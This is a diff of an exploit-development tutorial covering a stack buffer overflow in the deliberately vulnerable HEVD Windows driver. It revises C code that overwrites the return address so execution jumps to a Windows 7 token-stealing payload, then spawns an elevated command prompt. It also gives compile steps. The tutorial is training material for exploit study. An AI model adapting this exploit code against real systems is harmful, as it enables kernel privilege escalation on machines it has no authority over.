@@ -83,9 +83,11 @@ Let's put together a program that interfaces with the driver without triggering 
 
 #define BUFFER_SIZE 2048
 
-int testOverflow(HANDLE hDevice);
 
-int main() {
+INT testOverflow(HANDLE hDevice);
+
+INT main() 
+{
     HANDLE hDevice;
     PCWSTR lpDeviceName = L"\\\\.\\HackSysExtremeVulnerableDriver";
 
@@ -93,41 +95,41 @@ int main() {
         lpDeviceName,
         GENERIC_READ | GENERIC_WRITE,
         FILE_SHARE_WRITE,
-        nullptr,
+        NULL,
         OPEN_EXISTING,
         FILE_ATTRIBUTE_NORMAL,
-        nullptr
+        NULL
     );
-
     if (hDevice == INVALID_HANDLE_VALUE) {
         printf("[-] Failed to open handle to driver: %lu\n", GetLastError());
+        return -1;
     } 
 
     printf("[+] Device opened successfully!\n");
 
-    testOverflow(hDevice);
+    if (TriggerExploit(hDevice) >= 0) {
+        printf("[+] Device successfully exploited!\n");
+    } else {
+        printf("[-] Exploit failed: %lu\n", GetLastError());
+    }
 
     printf("[+] Cleaning up and closing handle...\n");
-
     CloseHandle(hDevice);
+
     return 0;
 }
 
 int testOverflow(HANDLE hDevice) {
 
-    PCHAR lpInBuffer { nullptr };
-    ULONG inBufferSize { 0 };
-    DWORD bytesReturned { 0 };
+    DWORD  *lpInBuffer;
+    ULONG   inBufferSize;
+    DWORD   bytesReturned;
     
     // Allocate a buffer of the correct size to use the driver
     // safely.  It will later be extended for the overflow
     inBufferSize = BUFFER_SIZE;
     
-    lpInBuffer = (PCHAR)HeapAlloc(GetProcessHeap(), 
-                                  HEAP_ZERO_MEMORY, 
-                                  inBufferSize);
-
-    if (!lpInBuffer) {
+    if (!(lpInBuffer = (DWORD *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, inBufferSize))) {
         printf("[-] Failed to allocate memory for buffer: %lu\n", GetLastError());
         return -1;
     }
@@ -138,6 +140,7 @@ int testOverflow(HANDLE hDevice) {
     // 'B' so we know if we have overflowed to the right place.
     memset(lpInBuffer, 'A', inBufferSize);
     memset(lpInBuffer + (inBufferSize - 4), 'B', 4);
+
 
     printf("[+] Sending buffer with IOCTL: 0x%x\n", HEVD_IOCTL_BUFFER_OVERFLOW);
     
@@ -151,7 +154,6 @@ int testOverflow(HANDLE hDevice) {
         &bytesReturned,
         nullptr
     );
-
     if (!result) {
         printf("[-] Failed to send IOCTL to HEVD Driver: %lu\n", GetLastError());
         return -1;
@@ -166,10 +168,18 @@ int testOverflow(HANDLE hDevice) {
 }
 ```
 
-Make sure to compile this for 32 bit Windows with the Visual Studio 2022 Developer Command Prompt.  The command is as follows:
+Make sure to compile this for 32 bit Windows with the Visual Studio 2022 Developer Command Prompt.
+
+Before you compile the program, you'll need to run the following in the command prompt to set it to compile code to 32 bit binaries.
 
 ```cmd
-cl /D WIN32 triggerOverflow.cpp
+"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars32.bat"
+```
+
+Then you can compile with:
+
+```cmd
+cl exploit.c
 ```
 
 ## Find the offsets
@@ -296,41 +306,33 @@ VOID shellcode() {
 We also need to change the `testOverflow` function to look like this:
 
 ```c++
-int testOverflow(HANDLE hDevice) {
+INT TriggerExploit(HANDLE hDevice) {
 
-    PCHAR lpInBuffer    { nullptr };
-    ULONG inBufferSize  { 0 };
-    DWORD bytesReturned { 0 };
-    DWORD lpShellcode   { 0 };
-    
+    DWORD  *lpInBuffer;
+    ULONG   inBufferSize;
+    DWORD   bytesReturned;
+    DWORD   lpShellcode;
+
     // Allocate a buffer of the correct size to overflow into the 
     // return address.  Need to overflow the buffer, the SEH EH4 
     // Registration Node, the saved EBP, and finally the return
     // address.  Last 4 bytes will overwrite the return address.
     inBufferSize = BUFFER_SIZE + EH4_REGISTRATION_NODE_SIZE + 4 + 4;
     
-    lpInBuffer = (PCHAR)HeapAlloc(GetProcessHeap(), 
-                                  HEAP_ZERO_MEMORY, 
-                                  inBufferSize);
-
-    if (!lpInBuffer) {
+    // Allocate the buffer
+    if (!(lpInBuffer = (DWORD *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, inBufferSize))) {
         printf("[-] Failed to allocate memory for buffer: %lu\n", GetLastError());
         return -1;
     }
-
     printf("[+] Created buffer of size: %lu\n", inBufferSize);
+
 
     // Set buffer to be full of 'A's
     memset(lpInBuffer, 'A', inBufferSize);
 
     // Set the last 4 bytes to contain a pointer to the "shellcode" function
-    lpShellcode = (DWORD)&shellcode;
-    lpInBuffer[inBufferSize - 4] = (lpShellcode & 0x000000FF);
-    lpInBuffer[inBufferSize - 3] = (lpShellcode & 0x0000FF00) >> 0x8;
-    lpInBuffer[inBufferSize - 2] = (lpShellcode & 0x00FF0000) >> 0x10;
-    lpInBuffer[inBufferSize - 1] = (lpShellcode & 0xFF000000) >> 0x18;
+    lpInBuffer[(inBufferSize / 4) - 1] = (DWORD)&TokenStealingPayloadWin7Generic;
 
-    printf("[+] lpShellcode: 0x%08X\n", lpShellcode);
 
     printf("[+] Sending buffer with IOCTL: 0x%x\n", HEVD_IOCTL_BUFFER_OVERFLOW);
     
@@ -339,17 +341,15 @@ int testOverflow(HANDLE hDevice) {
         HEVD_IOCTL_BUFFER_OVERFLOW,
         lpInBuffer,
         inBufferSize,
-        nullptr,
+        NULL,
         0,
         &bytesReturned,
-        nullptr
+        NULL
     );
-
     if (!result) {
         printf("[-] Failed to send IOCTL to HEVD Driver: %lu\n", GetLastError());
         return -1;
     }
-
     printf("[+] IOCTL sent successfully to HEVD driver!\n");
 
     printf("[+] Freeing input buffer...\n");
@@ -358,8 +358,6 @@ int testOverflow(HANDLE hDevice) {
     return 0;
 }
 ```
-
-> Take note that you may have to change the endianness of the pointer to the `shellcode` function. This is done with the bit flip operations used in the code above. 
 
 Let's set a breakpoint just before the return of the TriggerOverflow function and see if we step into our assembly sequence.
 
@@ -554,10 +552,10 @@ The final exploit code, cleaned up a bit, is below:
 INT TriggerExploit(HANDLE hDevice);
 VOID TokenStealingPayloadWin7Generic();
 
-INT main() {
-    HANDLE hDevice { nullptr };
+INT main() 
+{
+    HANDLE hDevice;
     PCWSTR lpDeviceName = L"\\\\.\\HackSysExtremeVulnerableDriver";
-    INT result { -1 };
 
     printf("[*] Author: @stolenfootball\n");
     printf("[*] Website: https://stolenfootball.github.io\n\n");
@@ -566,12 +564,11 @@ INT main() {
         lpDeviceName,
         GENERIC_READ | GENERIC_WRITE,
         FILE_SHARE_WRITE,
-        nullptr,
+        NULL,
         OPEN_EXISTING,
         FILE_ATTRIBUTE_NORMAL,
-        nullptr
+        NULL
     );
-
     if (hDevice == INVALID_HANDLE_VALUE) {
         printf("[-] Failed to open handle to driver: %lu\n", GetLastError());
         return -1;
@@ -579,29 +576,26 @@ INT main() {
 
     printf("[+] Device opened successfully!\n");
 
-    result = TriggerExploit(hDevice);
-    if (result < 0) {
+    if (TriggerExploit(hDevice) >= 0) {
+        printf("[+] Device successfully exploited!\n");
+        printf("[+] Launching elevated command prompt...\n");
+        system("cmd");
+    } else {
         printf("[-] Exploit failed: %lu\n", GetLastError());
-        return -1;
     }
 
-    printf("[+] Device successfully exploited!\n");
-    
     printf("[+] Cleaning up and closing handle...\n");
     CloseHandle(hDevice);
-
-    printf("[+] Launching elevated command prompt...\n");
-    system("cmd");
 
     return 0;
 }
 
 INT TriggerExploit(HANDLE hDevice) {
 
-    PCHAR lpInBuffer    { nullptr };
-    ULONG inBufferSize  { 0 };
-    DWORD bytesReturned { 0 };
-    DWORD lpShellcode   { 0 };
+    DWORD  *lpInBuffer;
+    ULONG   inBufferSize;
+    DWORD   bytesReturned;
+    DWORD   lpShellcode;
 
     // Allocate a buffer of the correct size to overflow into the 
     // return address.  Need to overflow the buffer, the SEH EH4 
@@ -609,26 +603,20 @@ INT TriggerExploit(HANDLE hDevice) {
     // address.  Last 4 bytes will overwrite the return address.
     inBufferSize = BUFFER_SIZE + EH4_REGISTRATION_NODE_SIZE + 4 + 4;
     
-    lpInBuffer = (PCHAR)HeapAlloc(GetProcessHeap(), 
-                                  HEAP_ZERO_MEMORY, 
-                                  inBufferSize);
-
-    if (!lpInBuffer) {
+    // Allocate the buffer
+    if (!(lpInBuffer = (DWORD *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, inBufferSize))) {
         printf("[-] Failed to allocate memory for buffer: %lu\n", GetLastError());
         return -1;
     }
-
     printf("[+] Created buffer of size: %lu\n", inBufferSize);
+
 
     // Set buffer to be full of 'A's
     memset(lpInBuffer, 'A', inBufferSize);
 
     // Set the last 4 bytes to contain a pointer to the "shellcode" function
-    lpShellcode = (DWORD)&TokenStealingPayloadWin7Generic;
-    lpInBuffer[inBufferSize - 4] = (lpShellcode & 0x000000FF);
-    lpInBuffer[inBufferSize - 3] = (lpShellcode & 0x0000FF00) >> 0x8;
-    lpInBuffer[inBufferSize - 2] = (lpShellcode & 0x00FF0000) >> 0x10;
-    lpInBuffer[inBufferSize - 1] = (lpShellcode & 0xFF000000) >> 0x18;
+    lpInBuffer[(inBufferSize / 4) - 1] = (DWORD)&TokenStealingPayloadWin7Generic;
+
 
     printf("[+] Sending buffer with IOCTL: 0x%x\n", HEVD_IOCTL_BUFFER_OVERFLOW);
     
@@ -637,17 +625,15 @@ INT TriggerExploit(HANDLE hDevice) {
         HEVD_IOCTL_BUFFER_OVERFLOW,
         lpInBuffer,
         inBufferSize,
-        nullptr,
+        NULL,
         0,
         &bytesReturned,
-        nullptr
+        NULL
     );
-
     if (!result) {
         printf("[-] Failed to send IOCTL to HEVD Driver: %lu\n", GetLastError());
         return -1;
     }
-
     printf("[+] IOCTL sent successfully to HEVD driver!\n");
 
     printf("[+] Freeing input buffer...\n");
@@ -691,6 +677,8 @@ __declspec(naked) VOID TokenStealingPayloadWin7Generic() {
     }
 }
 ```
+
+This can also be found on Github [here](https://github.com/stolenfootball/HEVDExploits/blob/main/BufferOverflowStack/Windows7x32/exploit.c).
 
 When writing exploit code it is even more difficult than normal to document what your code is doing, since the program being exploited isn't included in the source.  As such, it is even more important than normal to include proper comments and explanations for everything non-obvious that the code is doing.
 
